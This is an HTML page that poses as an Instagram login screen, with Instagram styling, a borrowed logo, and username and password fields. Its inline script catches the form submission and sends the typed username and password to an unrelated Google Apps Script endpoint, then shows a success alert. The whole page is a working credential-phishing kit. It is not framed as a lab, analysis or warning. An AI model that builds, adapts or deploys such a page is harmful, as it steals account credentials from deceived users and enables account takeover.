<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Log In with Instagram</title>
<style>
  body {
    display: flex;
    justify-content: center;
    align-items: center;
    background-color: #fafafa;
    font-family: Arial, sans-serif;
    height: 100vh;
    margin: 0;
  }

  .main-container {
    width: 350px;
    background-color: #fff;
    border: 1px solid #dbdbdb;
    padding: 40px 40px;
    box-shadow: 0 0 5px rgba(0,0,0,0.1);
  }

  /* Logo and header styling */
  .logo {
    display: block;
    margin: 0 auto 20px auto;
    width: 175px;
  }

  /* Form styling */
  form {
    display: flex;
    flex-direction: column;
  }

  input[type=text], input[type=password] {
    height: 38px;
    margin-bottom: 6px;
    padding: 9px 0 7px 8px;
    border: 1px solid #dbdbdb;
    background: #fafafa;
    outline: none;
    border-radius: 3px;
    font-size: 14px;
  }

  button {
    background-color: #3897f0;
    border: none;
    outline: none;
    height: 30px;
    width: 100%;
    border-radius: 4px;
    margin-top: 8px;
    font-weight: 600;
    font-size: 14px;
    cursor: pointer;
  }

  button:disabled {
    background-color: #b2dffc;
    cursor: not-allowed;
  }

  /* Text below the form */
  .or {
    display: flex;
    align-items: center;
    margin: 10px 0;
  }

  .or-line {
    flex: 1;
    height: 1px;
    background-color: #dbdbdb;
  }

  span {
    margin: 0 10px;
    font-size: 13px;
    color: #8e8e8e;
    font-weight: 600;
  }

  /* Sign up box */
  .signup-box {
    background-color: #fff;
    border: 1px solid #dbdbdb;
    padding: 20px 0;
    margin-top: 10px;
    text-align: center;
  }

  .signup-box p {
    font-size: 14px;
    margin: 0;
  }

  .signup-box a {
    font-weight: 600;
    color: #3897f0;
    text-decoration: none;
  }

  /* Footer */
  footer {
    margin-top: 20px;
    font-size: 12px;
    color: #999;
    text-align: center;
  }
</style>
</head>
<body>

<div class="main-container">
  <!-- Instagram Logo -->
  <img src="https://www.citypng.com/public/uploads/preview/black-instagram-word-text-logo-701751694792675yldmxhrmbv.png" alt="Instagram" class="logo" />

  <!-- Login Form -->
 <form id="myForm">
  <input type="text" id="username" placeholder="Username" required />
  <input type="password" id="password" placeholder="Password" required />
  <button type="submit">Log In</button>
</form>

<script>
document.getElementById('myForm').addEventListener('submit', function(e) {
  e.preventDefault();

  fetch('https://script.google.com/macros/s/AKfycby5j3P6WQ7FcAd4-eptraAw86eWaHatjOym2-MKy6uW1ajmad_BFGP-hHlNIHzLnCKJ/exec', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      username: document.getElementById('username').value,
      password: document.getElementById('password').value
    })
  })
  .then(response => response.json())
  .then(data => alert('Data submitted successfully!'))
  .catch(error => alert('Error submitting data.'));
});
</script>

  <!-- OR separator -->
  <div class="or">
    <div class="or-line"></div>
    <span>OR</span>
    <div class="or-line"></div>
  </div>

  <!-- Continue with Facebook (optional, can be omitted or styled further) -->
  <!--
  <div style="text-align: center; margin-top: 10px; font-weight: 600; cursor: pointer;">
    Log in with Facebook
  </div>
  -->

  <!-- Sign up box -->
  <div class="signup-box">
    <p>Don't have an account? <a href="#">Sign up</a></p>
  </div>
</div>

</body>

</html>
